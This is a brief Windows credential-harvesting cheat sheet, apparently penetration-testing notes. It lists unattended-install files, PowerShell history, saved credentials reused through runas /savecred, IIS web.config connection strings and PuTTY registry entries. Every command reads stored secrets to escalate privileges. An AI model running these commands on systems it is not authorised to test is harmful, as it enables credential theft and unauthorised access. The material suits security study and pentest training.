```
# Harvesting from the usual locations  
  
# Unattended Windows Installations  
C:\Unattend.xml  
C:\Windows\Panther\Unattend.xml  
C:\Windows\Panther\Unattend\Unattend.xml  
C:\Windows\system32\sysprep.inf  
C:\Windows\system32\sysprep\sysprep.xml  

# Lookup powershell history for user
# powershell replace user profile with: $Env:userprofile  
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  

# Look at saved windows creds
cmdkey /list

# You can't see actual passwords, but creds can be passed to run a command
runas /savecred /user:admin cmd.exe  

# IIS config can store creds in web.config:
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString  

# Retrieve from PuTTY:
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
